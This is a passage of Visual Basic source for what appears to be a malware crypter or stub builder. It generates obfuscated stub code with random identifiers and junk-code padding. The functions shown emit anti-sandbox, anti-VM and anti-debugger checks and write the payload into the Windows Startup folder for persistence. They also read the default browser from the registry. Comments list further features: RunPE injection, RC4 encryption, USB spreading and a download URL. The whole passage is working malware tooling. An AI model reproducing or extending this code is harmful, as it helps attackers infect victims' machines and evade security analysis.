        a = a + "public " + Dec(0).Text + " as string, " + Dec(2).Text + " as string, " + Dec(3).Text + " as string, " + Dec(4).Text + " as string, " + Dec(5).Text + " as string, " + Dec(6).Text + " as string, " + Dec(7).Text + " as string, " + Dec(8).Text + " as string, " + Dec(9).Text + " as string, " + Dec(10).Text + " as string, " + Dec(11).Text + " as string, " + Dec(12).Text + " As String" + vbCrLf
        a = a + "Public " + Dec(22).Text + "," + Dec(23).Text + "," + Dec(24).Text + " as integer " + vbCrLf
        a = a + "public " + Dec(20).Text + " As New " + TxtCls(4).Text + "  ' Runpe " + vbCrLf         ' RunPe
        
M_Public = a
        
        
End Function

Public Function m_Anti()

' Antis

    Dim a       As String
        
    Dim aVar1   As String
    Dim aVar2   As String
    Dim aVar3   As String
    Dim aVar4   As String
    Dim aVar5   As String
    Dim aVar6   As String
    Dim aVar7   As String
    Dim aVar8   As String
    Dim aVar9   As String
    Dim aVar10   As String
    Dim aVar11   As String
    Dim aVar12   As String
    Dim aVar13   As String
    Dim aVar14   As String
    Dim aVar15   As String
    Dim aVar16   As String
    Dim aVar17   As String
    Dim aVar18   As String
    
     RndStrings aVar1
     RndStrings aVar2
     RndStrings aVar3
     RndStrings aVar4
     RndStrings aVar5
     RndStrings aVar6
     RndStrings aVar7
     RndStrings aVar8
     RndStrings aVar9
     RndStrings aVar10
     RndStrings aVar11
     RndStrings aVar12
     RndStrings aVar13
     RndStrings aVar14
     RndStrings aVar15
     RndStrings aVar16
     RndStrings aVar17
     RndStrings aVar18
    
    
    a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
       
    a = a + "public sub " + TxtSub(9) + "(" + aVar1 + " as integer)" & vbCrLf     ' avar1 = Cnumber
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a & Trash3 & vbCrLf
    a = a + "Dim " + aVar2 + "(6) as string " & vbCrLf    'tocheckmalkei3
    a = a + "Dim " + aVar3 + "(3) as string " & vbCrLf    'ecpechakk3i23joed
    a = a + "Dim " + aVar4 + "(1) as string " & vbCrLf    'eige4iu5ojt
    a = a + "Dim " + aVar5 + "(3) as string " & vbCrLf    'soijr4ijerfr
    a = a + "Dim " + aVar6 + "(1) as string " & vbCrLf    'aSerials
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar7 + " as string * 255 " & vbCrLf 'tys8dhiao34
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar8 + " as string * 255 " & vbCrLf 'qiodsihiutj894j3r
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar9 + " as string " & vbCrLf       'idhoawujnrknrmwr
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar10 + " as long " & vbCrLf         'ythiu23jnkwrlwqe
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar11 + " as string " & vbCrLf       'aowujn3krere
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar12 + " as long " & vbCrLf         'oihn2i4hjwrks
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar13 + " as long " & vbCrLf         'i
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar14 + " as object " & vbCrLf       'rhn3jkewinaswi34e
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Dim " + aVar15 + " as object " & vbCrLf       'urqinjkhiankqi4wr
    
    a = a + "'initialize strings and arrays" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar2 + "(0) = ""Sndbx""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar2 + "(1) = ""tester""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar2 + "(2) = ""panda""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar2 + "(3) = ""currentuser""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar2 + "(4) = ""Schmidti""" & vbCrLf
    a = a + aVar2 + "(5) = ""andy""" & vbCrLf
    a = a + aVar2 + "(6) = ""Andy""" & vbCrLf & vbCrLf & vbCrLf

    a = a + aVar3 + "(0) = ""AUTO""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar3 + "(1) = ""VMLOG""" & vbCrLf
    a = a + aVar3 + "(2) = ""NONE-DUSEZ""" & vbCrLf
    a = a + aVar3 + "(3) = ""XPSP3""" & vbCrLf & vbCrLf & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar4 + "(0) = ""SbieDll.dll""" & vbCrLf
    a = a + aVar4 + "(1) = ""dbghelp.dll""" & vbCrLf & vbCrLf & vbCrLf

    a = a + aVar5 + "(0) = ""*VIRTUAL*""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar5 + "(1) = ""*VMWARE*""" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar5 + "(2) = ""*VBOX*""" & vbCrLf
    a = a + aVar5 + "(3) = ""*QEMU*""" & vbCrLf & vbCrLf & vbCrLf

Sleep (500)

    a = a + aVar7 + " = Environ$(""username"")" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar8 + " = Environ$(""computername"")" & vbCrLf & vbCrLf & vbCrLf

    a = a + "if " + aVar1 + " = 0 then exit sub " & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "'Sandbox Detections" & vbCrLf
    a = a + " Select Case " + aVar1 & vbCrLf + "Case 1 " & vbCrLf & vbCrLf

    a = a + "For " + aVar13 + " = 0 to ubound(" + aVar2 + ")" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "if left(" + aVar7 + ", len(" + aVar2 + "(" + aVar13 + "))) = " + aVar2 + "(" + aVar13 + ") then E_M_N (""Sandbox"")" & vbCrLf
    a = a + " next " + aVar13 & vbCrLf & vbCrLf

    a = a + "Case 2 " & vbCrLf + "'VirtualPC Detections" & vbCrLf + "For " + aVar13 + " =0 to ubound(" + aVar3 + ")" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "If left (" + aVar8 + ", len(" + aVar3 + "(" + aVar13 + "))) = " + aVar3 + "(" + aVar13 + ") then E_M_N (""VirtualPC"")" & vbCrLf
    a = a + "Next " + aVar13 & vbCrLf & vbCrLf

    a = a + "Case 3 " & vbCrLf & vbCrLf + "'Dll Detections" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "For " + aVar13 + " = 0 to ubound(" + aVar4 + ")" & vbCrLf
    a = a + "if GetModuleHandleA(" + aVar4 + "(" + aVar13 + ")) then E_M_N (""Library Detection"")" & vbCrLf
    a = a + "next " + aVar13 & vbCrLf & vbCrLf

    a = a + " Case 4 " & vbCrLf & vbCrLf + "' Harddrive Detections " & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "If RegOpenKeyEx(&H80000002, ""SYSTEM\ControlSet001\Services\Disk\Enum"", 0, &H20019, " + aVar10 + ") = 0 Then " & vbCrLf
    a = a + aVar11 + " = Space$(255): " + aVar12 + " = 255 " & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "If RegQueryValueEx(" + aVar10 + ", ""0"", 0, 1, ByVal " + aVar11 + "," + aVar12 + ") = 0 Then" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar11 + " = ucase(Left$(" + aVar11 + "," + aVar12 + " -1))" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "For " + aVar13 + " = 0 to ubound(" + aVar5 + ")" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    
Sleep (500)

    a = a + "if " + aVar11 + " like " + aVar5 + "(" + aVar13 + ") then call E_M_N(""Hardrive Detection"")" & vbCrLf
    a = a + "next " + aVar13 & vbCrLf
    a = a + "End if " & vbCrLf + "Call RegCloseKey( " + aVar10 + ")" & vbCrLf
    a = a + "end if " & vbCrLf & vbCrLf

    a = a + "Case 5 " & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "'Windows Serial Detections" & vbCrLf
    a = a + "On Error Resume Next " & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "Set " + aVar14 + " = GetObject(""winmgmts:{impersonationLevel=impersonate}"").InstancesOf(Split(""Win32_OperatingSystem,SerialNumber"", "","")(0))" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar9 + " = """"" & vbCrLf
    a = a + "For Each " + aVar15 + " in " + aVar14 & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + aVar9 + " = " + aVar15 + ".Properties_(Split(""Win32_OperatingSystem,SerialNumber"", "","")(1))" & vbCrLf
    a = a + aVar9 + " = Trim(" + aVar9 + ")" & vbCrLf
    a = a + "Next " & vbCrLf
    
    a = a + "for " + aVar13 + " = 0 to ubound(" + aVar6 + ")" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "if " + aVar9 + " = " + aVar6 + "(" + aVar13 + ") then E_M_N (""Window's Serial"")" & vbCrLf
    a = a + "Next " + aVar13 & vbCrLf & vbCrLf

    a = a + "end select" & vbCrLf
    a = a + "end sub " & vbCrLf
    
    a = a + "private Sub E_M_N(Message as string)" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
    a = a + "MsgBox ""This program cannot be run through sandboxes, or virtual machines."" + vbnewline + _ " & vbCrLf + """Case: "" & Message " & vbCrLf
    a = a + "End Sub " & vbCrLf

m_Anti = a

End Function


Private Sub Null_Info()

With Form1
    ' Strings etc...
    
    '13,14,15,16
    
    '1,2,3,4,5
    
    'File_Data = Dec(0).Text
    'Read_Settings = dec(1).text
    'Encryption_Key = dec(2)
    'Inject_Into = dec(3)
    'DelayRunTime = dec(4)
    'FileData = dec(5)
    'ExtractionPath = dec6
    'ExecuteMode = dec7
    'OutputName =dec (8)
    'EncryptBound = dec(9)
    'WillIFade = dec(10)
    'dlext = dec(11)
    'dlurl = dec(12)
    'split_file = dec(13).text
    'Final_Split = dec(14)
    'StubSplit() = Dec(15)
    'Asettings() = dec(16)
    'Bsettings() = dec(17)
    'InitialSplit() = dec(18)
    
    
    
    'Message_icon = dec(22)
    'FileNumber = dec(23)
    
    '#FF = dec(25).Text
    
    
    'split_main = cst(2).text
    
    
    ' Classes...
    
''    Dec(20) = Runpe
''    TxtCls(4) = runpe

'Functions...
'njio43jkrre54 = TxtFunc(0)
'IsXP = txtfunc(1)
'bvdkjso3i = txtfunc(2)
'urojiq3k4lmwrewj42 [CALL API] = txtfunc(3)
'yewheh93 = txtfunc(5)
'eioafksdh3oeijiwo3 = txtfunc(6)
'EncryptFile = txtfunc(7)
'DecryptFile = TxtFunc(8)
'Rc4 = txtfunc(9)
'AddToStartup = txtfunc(10)
'IsProcessRunning = txtfunc(11)
'Registry_Read = TxtFunc(12)
'App.path etc = TxtFunc(13)

'Types...
'OsVersionInfo = txttype(0)

' Subs...
'1) Decryptstring = txtsub(0)
'2) bjaeirrq3kjmer43 = txtsub(1)
'3) faiowker = txtsub(2)
'4) GetVars = txtsub(3)
'5) Fileexists = txtsub(4)
'6) TerminateProc = txtsub(5)
'7) Bj9eriuqwerjlw =TxtSub(6)
'8) FadeAway = txtsub(7)
'9) eyrhiq2jljwhjn4esd = txtsub(8)
'10)sAnti = TxtSub(9)
'11) USB_Spread = txtsub(10)
'12) encryptbyte = txtsub(11)
'13) decryptbyte = txtsub(12)
'14) EncryptString = txtsub(13)
'15) Gdata = txtsub(15)

End With

End Sub

Private Function M_ReadSettings()

    Dim a       As String
    Dim ReadSetsVar1    As String
    
    ReadSetsVar1 = GenNumKey(RandomNumber(25, 3))
            
        a = a + "private sub " + Dec(1).Text & vbCrLf
        a = a + "On Error Resume Next" & vbCrLf
        a = a + "Dim " + ReadSetsVar1 + " as Integer" & vbCrLf & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(18) + "() =  Split(" + Dec(0) + "," + Cst(0) + ")" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(14) + " = Split(" + Dec(18) + "(1)," + Cst(1) + ")" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(22) + " = " + Dec(14) + "(3)" & vbCrLf
        a = a + Dec(2) + " = " + Dec(14) + "(4)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(4) + " = " + Dec(14) + "(15)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(3) + " = " + Dec(14) + "(16)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(10) + " = " + Dec(14) + "(24)" & vbCrLf
        a = a + Dec(11) + " = " + Dec(14) + "(25)" & vbCrLf
       If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + Dec(12) + " = " + Dec(14) + "(26)" & vbCrLf

'Include Antis
If Check17.Value = 1 Then
        a = a + "'ANTIS BEGIN BELOW" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + "if " + Dec(14) + "(5) = ""1"" or " + Dec(14) + "(10) = ""1"" or " + Dec(14) + "(11) = ""1"" or " + Dec(14) + "(12) = ""1"" then call " + TxtSub(9) + "(1): call " + TxtSub(9) + "(3)" & vbCrLf
        a = a + "If " + Dec(14) + "(6) = ""1"" Or " + Dec(14) + "(7) = ""1"" Or " + Dec(14) + "(8) = ""1"" Then Call " + TxtSub(9) + "(2)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + "If " + Dec(14) + "(29) = ""1"" Then Call " + TxtSub(9) + "(4)" & vbCrLf
        a = a + "If " + Dec(14) + "(30) = ""1"" Then Call " + TxtSub(9) + "(3)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + "If " + Dec(14) + "(31) = ""1"" Then Call " + TxtSub(9) + "(5)" & vbCrLf
        a = a + "For " + ReadSetsVar1 + " = 9 to 14" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if " + Dec(14) + "(" + ReadSetsVar1 + ") = 1 then call " + TxtSub(9) + "(" + ReadSetsVar1 + ")" & vbCrLf
        a = a + "next " + ReadSetsVar1 & vbCrLf
End If

'Include Stealth Code
If Check26.Value = 1 Then
        a = a + "'STEALTH" & vbCrLf
        a = a + "for " + ReadSetsVar1 + " = 17 to 22" & vbCrLf
        a = a + "if " + Dec(14) + "(" + ReadSetsVar1 + ") = 1 then call " + TxtSub(5) + "(" + ReadSetsVar1 + ")" & vbCrLf
        a = a + "Next " + ReadSetsVar1 & vbCrLf
End If
        a = a + "end sub " & vbCrLf

M_ReadSettings = a

End Function

Private Function M_Startup()

With Form1

DoEvents

    Dim a       As String
    Dim StartUpVar1    As String
    Dim StartUpVar2    As String
    
    RndStrings StartUpVar1
    RndStrings StartUpVar2
    
    Sleep (500)
      
        a = a + "Private Sub " + TxtSub(6) & vbCrLf
        a = a + "on local error resume next" + vbCrLf
        a = a + "Dim " + StartUpVar1 + " as String" + vbCrLf
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        a = a + "Dim " + StartUpVar2 + " as string" + vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash4 + S1
        End If
        
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        a = a + StartUpVar2 + " =  " + App_Path + vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "open " + StartUpVar2 + " For binary as #1" + vbCrLf
        a = a + StartUpVar1 + " = space(lof(1))" + vbCrLf
        a = a + "Get #1, , " + StartUpVar1 + vbCrLf
        a = a + "Close #1" + vbCrLf & vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + Dec(13) + "() = split(" + StartUpVar1 + "," + Cst(2) + ")" + vbCrLf
        If Check20.Value = 1 Then a = a + Trash1 + S1
        a = a + Dec(13) + "(1) = " + TxtFunc(9).Text + "(" + Dec(13) + "(1), " + Dec(2) + ")" + vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "if " + Dec(14) + "(36) = 1 then" + vbCrLf
        a = a + "if " + TxtFunc(1) + " = true then " + vbCrLf
        a = a + "open ""C:\Documents and Settings\"" & Environ(""Username"") & ""\Start Menu\Programs\Startup\"" & " + Dec(14) + "(33) for binary as #1" + vbCrLf
        a = a + " put #1 , , " + StartUpVar1 + vbCrLf
        a = a + "Close #1" + vbCrLf + vbCrLf

        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        a = a + "Else" + vbCrLf
        a = a + "open ""C:\Users\"" & Environ(""Username"") & ""\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"" & " + Dec(14) + "(33) for binary as #1" + vbCrLf
        a = a + "put #1, , " + StartUpVar1 + vbCrLf
        a = a + "Close #1" + vbCrLf + vbCrLf
        a = a + "end if" + vbCrLf + vbCrLf
        a = a + "Else" + vbCrLf + vbCrLf + vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash3 + S1
        End If

        a = a + "if " + TxtFunc(1) + " = true then " + vbCrLf
        a = a + "open ""C:\Documents and Settings\"" & Environ(""Username"") & ""\Start Menu\Programs\Startup\"" & " + Dec(14) + "(33) for binary as #1" + vbCrLf
        a = a + " put #1 , , " + Dec(13) + "(1)" + vbCrLf
        a = a + "Close #1" + vbCrLf + vbCrLf
        a = a + "Else" + vbCrLf
        a = a + "open ""C:\Users\"" & Environ(""Username"") & ""\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"" & " + Dec(14) + "(33) for binary as #1" + vbCrLf
        a = a + "put #1, , " + Dec(13) + "(1)" + vbCrLf
        a = a + "Close #1" + vbCrLf + vbCrLf
        a = a + "end if" + vbCrLf + vbCrLf
        a = a + "end if " + vbCrLf + vbCrLf
        If Check20.Value = 1 Then
               
        Sleep (500)
        
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash3 + S1
        End If
         
       a = a + "End Sub" + vbCrLf + vbCrLf
               
M_Startup = a

End With

End Function


Private Function f_Browser()

Randomize

    Dim a           As String
    Dim BrowserVar1        As String
    Dim BrowserVar2        As String
    Dim BrowserVar3        As String
    Dim BrowserVar4        As String
    Dim BrowserVar5        As String
    
    RndStrings BrowserVar1
    RndStrings BrowserVar2
    RndStrings BrowserVar3
    RndStrings BrowserVar4
    RndStrings BrowserVar5
        
        Sleep (500)
        
        a = a + "Public Function " + TxtFunc(0).Text + "(Optional Byval " + BrowserVar5 + " As boolean) as string " & vbCrLf
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        a = a + "Dim " + BrowserVar1 + " as Long" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
    End If
        a = a + "Dim " + BrowserVar2 + " as Long" & vbCrLf
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If

        a = a + "Dim " + BrowserVar3 + " as Long" & vbCrLf
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex = 2 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "Dim " + BrowserVar4 + " as String" & vbCrLf
        
        If Check11.Value = 1 Then
        a = a & Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash4 + S1
        End If
        
        a = a + "Call RegOpenKey(&H80000000, ""http\shell\open\command""," + BrowserVar1 + ")" & vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "If " + BrowserVar1 + " then " & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + vbCr + BrowserVar2 + " = RegQueryValueEx(" + BrowserVar1 + ", vbNullString, ByVal 0&, 0&, ByVal 0&," + BrowserVar3 + ")" & vbCrLf
        a = a + "if " + BrowserVar2 + " = 0 then " & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + BrowserVar4 + " = Space$(" + BrowserVar3 + ")" & vbCrLf
        a = a + "Call RegQueryValueEx(" + BrowserVar1 + ", vbNullString, ByVal 0&, 0&, ByVal" + BrowserVar4 + "," + BrowserVar3 + ")" & vbCrLf
        
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + BrowserVar4 + " = left$(" + BrowserVar4 + "," + BrowserVar3 + ")" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if not " + BrowserVar5 + " then " & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash4 + S1
        End If
        
        a = a + BrowserVar4 + " = Mid(" + BrowserVar4 + ", 2)" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + TxtFunc(0) + " = Mid$(" + BrowserVar4 + ",1,instr(1, " + BrowserVar4 + ", Chr$(34)) - 1)" & vbCrLf
        a = a + "else" & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash4 + S1
        End If

        a = a + TxtFunc(0) + " = " + BrowserVar4 & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "end if " & vbCrLf + "end if" & vbCrLf + "end if" & vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + "Call RegCloseKey(" + BrowserVar1 + ")" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "End Function" & vbCrLf
  
  f_Browser = a
    
End Function

Public Function S1()

Dim a As String

a = vbCrLf

S1 = a

End Function

Private Function F_XP()

With Form1

    Dim a As String
    Dim XPVar1 As String
    Dim XPVar2 As String
    
    RndStrings XPVar1
    RndStrings XPVar2
    
    Sleep (500)
    
        a = a + "Private function " + TxtFunc(1) & vbCrLf
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) + S1
        a = a + "Dim " + XPVar1 + " as " + TxtType(0) & vbCrLf
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) + S1
        End If
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "Dim " + XPVar2 + " as long" & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If

        a = a + XPVar1 + "." + VarT1 + " = Len(" + XPVar1 + ")" & vbCrLf & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex = 2 Then a = a + Trash3 + S1
        End If
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + XPVar2 + " = GetVersionEx(" + XPVar1 + ")" & vbCrLf & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if " + XPVar1 + "." + VarT3 + " = 1 and " + XPVar1 + "." + VarT2 + " = 5 then " + TxtFunc(1) + " = True" & vbCrLf & vbCrLf
        a = a + "End Function" & vbCrLf & vbCrLf
  
    F_XP = a

End With

End Function

Private Function M_Delay()

With Form1

    Dim a       As String
    Dim DelayVar1    As String
    Dim DelayVar2    As String
    
    RndStrings DelayVar1
    RndStrings DelayVar2
    
        a = a + "Private Sub " + TxtSub(8) + "(Byval " + TxtParam(0) + " As single )" + vbCrLf
        a = a + "Dim " + DelayVar1 + " As single" + vbCrLf
        
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        
        a = a + "dim " + DelayVar2 + " As single" + vbCrLf
        
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        
        a = a + DelayVar1 + " = Timer" + vbCrLf + vbCrLf
        a = a + "Do While " + DelayVar1 + " + " + TxtParam(0) + "> Timer" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + DelayVar2 + " = DoEvents" + vbCrLf
        a = a + "if " + DelayVar1 + "> timer then" + vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + DelayVar1 + " = timer " + vbCrLf
        a = a + "End if " + vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
